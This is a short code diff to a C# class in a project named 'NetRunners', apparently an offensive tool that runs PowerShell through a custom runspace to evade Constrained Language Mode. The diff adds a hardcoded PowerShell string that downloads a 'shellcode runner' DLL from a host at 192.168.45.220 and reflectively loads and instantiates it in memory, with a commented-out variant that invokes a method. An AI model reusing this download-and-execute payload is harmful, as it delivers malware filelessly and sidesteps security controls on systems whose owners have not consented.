@@ -9,6 +9,10 @@ namespace NetRunners.Clm
 {
     public static class Command
     {
+        // command to execute (by default: reflectively load DLL shellcode runner) (second one creates instance of testclass, the first one executes a static method.)
+        //public static string cmd = "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.220/bin/x64/NetRunnersDll.dll')).GetType('NetRunnersDll.TestClass').GetMethod('TestClass').Invoke(0, $null)";
+        public static string cmd = "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.220/bin/x64/NetRunnersDll.dll')).CreateInstance('NetRunnersDll.TestClass')";
+        
         public static void Execute(string cmd)
         {
             Runspace rs = RunspaceFactory.CreateRunspace();
